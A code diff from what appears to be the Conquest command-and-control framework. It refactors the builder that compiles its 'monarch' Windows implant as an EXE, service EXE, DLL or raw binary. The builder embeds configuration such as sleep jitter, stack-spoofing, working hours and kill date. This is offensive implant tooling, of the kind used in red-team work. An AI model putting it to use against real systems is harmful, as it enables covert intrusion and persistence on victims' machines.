@@ -8,7 +8,7 @@ import ../../types/[common, server, event]
 
 const PLACEHOLDER = "PLACEHOLDER"
 
-proc serializeConfiguration(cq: Conquest, listener: Listener, sleepSettings: SleepSettings, killDate: int64, clientId: string = ""): seq[byte] = 
+proc serializeConfiguration(cq: Conquest, agentBuildInformation: AgentBuildInformation, listener: Listener, clientId: string = ""): seq[byte] = 
     
     var packer = Packer.init()
 
@@ -25,20 +25,20 @@ proc serializeConfiguration(cq: Conquest, listener: Listener, sleepSettings: Sle
         packer.addDataWithLengthPrefix(string.toBytes(listener.pipe))
 
     # Sleep settings
-    packer.add(sleepSettings.sleepDelay)
-    packer.add(sleepSettings.jitter)
-    packer.add(uint8(sleepSettings.sleepTechnique))
-    packer.add(uint8(sleepSettings.spoofStack))
+    packer.add(agentBuildInformation.sleepSettings.sleepDelay)
+    packer.add(agentBuildInformation.sleepSettings.jitter)
+    packer.add(uint8(agentBuildInformation.sleepSettings.sleepTechnique))
+    packer.add(uint8(agentBuildInformation.sleepSettings.spoofStack))
     
     # Working hours
-    packer.add(uint8(sleepSettings.workingHours.enabled))
-    packer.add(uint32(sleepSettings.workingHours.startHour))
-    packer.add(uint32(sleepSettings.workingHours.startMinute))
-    packer.add(uint32(sleepSettings.workingHours.endHour))
-    packer.add(uint32(sleepSettings.workingHours.endMinute))
+    packer.add(uint8(agentBuildInformation.sleepSettings.workingHours.enabled))
+    packer.add(uint32(agentBuildInformation.sleepSettings.workingHours.startHour))
+    packer.add(uint32(agentBuildInformation.sleepSettings.workingHours.startMinute))
+    packer.add(uint32(agentBuildInformation.sleepSettings.workingHours.endHour))
+    packer.add(uint32(agentBuildInformation.sleepSettings.workingHours.endMinute))
 
     # Kill date
-    packer.add(uint64(killDate))
+    packer.add(uint64(agentBuildInformation.killDate))
 
     # Public key for key exchange
     packer.addData(cq.keyPair.publicKey)
@@ -78,11 +78,19 @@ proc replaceAfterPrefix(content, prefix, value: string, quoted: bool = false): s
             it
     ).join("\n")
     
-proc compile(cq: Conquest, placeholderLength: int, modules: uint32, verbose: bool, listenerType: ListenerType, clientId: string = ""): string = 
+proc compile(cq: Conquest, placeholderLength: int, agentBuildInformation: AgentBuildInformation, listener: Listener, clientId: string = ""): string = 
     
-    let 
-        configFile = fmt"{CONQUEST_ROOT}/src/agents/monarch/nim.cfg"  
-        exeFile = fmt"{CONQUEST_ROOT}/bin/monarch.x64.exe" 
+    # Build payload name 
+    let listenerType = ($listener.listenerType).toLowerAscii()
+    let arch = "x64"
+    let ext = case agentBuildInformation.payloadType
+    of EXE: "exe"
+    of SVC: "svc.exe"
+    of DLL: "dll"
+    of BIN: "bin"
+
+    let configFile = fmt"{CONQUEST_ROOT}/src/agents/monarch/nim.cfg"  
+    let exeFile = fmt"{CONQUEST_ROOT}/bin/monarch.{listenerType}_{arch}.{ext}" 
 
     let buildCommand = fmt"nim --os:windows --cpu:amd64 --gcc.exe:x86_64-w64-mingw32-gcc --gcc.linkerexe:x86_64-w64-mingw32-gcc -o:{exeFile} c {CONQUEST_ROOT}/src/agents/monarch/main.nim"
 
@@ -90,9 +98,10 @@ proc compile(cq: Conquest, placeholderLength: int, modules: uint32, verbose: boo
     let placeholder = PLACEHOLDER & "A".repeat(placeholderLength - len(PLACEHOLDER))
     var config = readFile(configFile)
                     .replaceAfterPrefix("-d:CONFIGURATION=", placeholder, quoted = true)    
-                    .replaceAfterPrefix("-d:MODULES=", $modules)
-                    .replaceAfterPrefix("-d:VERBOSE=", $verbose)
-                    .replaceAfterPrefix("-d:TRANSPORT_", $listenerType)
+                    .replaceAfterPrefix("-d:MODULES=", $agentBuildInformation.modules)
+                    .replaceAfterPrefix("-d:VERBOSE=", $agentBuildInformation.verbose)
+                    .replaceAfterPrefix("-d:TRANSPORT_", $(listener.listenerType))
+                    .replaceAfterPrefix("-d:PAYLOAD_", $(agentBuildInformation.payloadType))
     writeFile(configFile, config)
 
     cq.info(fmt"Placeholder created ({placeholder.len()} bytes).")
@@ -166,12 +175,11 @@ proc agentBuild*(cq: Conquest, agentBuildInformation: AgentBuildInformation, cli
     if not cq.dbListenerExists(agentBuildInformation.listenerId): 
         cq.error(fmt"Listener {agentBuildInformation.listenerId} does not exist.")
         return
-
+    
     let listener = cq.listeners[agentBuildInformation.listenerId]
+    var config = cq.serializeConfiguration(agentBuildInformation, listener, clientId)
     
-    var config = cq.serializeConfiguration(listener, agentBuildInformation.sleepSettings, agentBuildInformation.killDate, clientId)
-    
-    let unpatchedExePath = cq.compile(config.len(), agentBuildInformation.modules, agentBuildInformation.verbose, listener.listenerType, clientId)
+    let unpatchedExePath = cq.compile(config.len(), agentBuildInformation, listener, clientId)
     if unpatchedExePath.isEmptyOrWhitespace():
         return 
 
